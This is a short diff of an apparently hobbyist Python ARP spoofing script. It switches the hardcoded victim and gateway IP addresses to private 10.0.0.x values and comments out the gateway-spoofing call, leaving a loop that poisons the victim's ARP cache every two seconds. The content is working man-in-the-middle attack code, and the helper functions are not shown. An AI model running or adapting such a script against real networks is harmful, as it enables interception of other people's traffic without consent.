@@ -29,8 +29,8 @@ def reArp(victim_ip,victim_mac, gateway_ip,gateway_mac):
 
 
 ##      MAIN        ##
-victim_ip = "10.16.64.1"
-gtw_ip    = "10.16.68.171"
+victim_ip = "10.0.0.82"
+gtw_ip    = "10.0.0.1"
 
 victim_mac = get_mac(victim_ip)#get mac of victim
 gtw_mac    = get_mac(gtw_ip)#get mac of gtw
@@ -41,7 +41,7 @@ packets_count = 0
 try:
     while True:
         spoof_target(victim_ip,victim_mac,gtw_ip)
-        spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!? (only with home router WTF!)
+        #spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!? (only with home router WTF!)
         packets_count = packets_count + 1
         print("\rPackets sent: " + str(packets_count), end="")
         time.sleep(2)
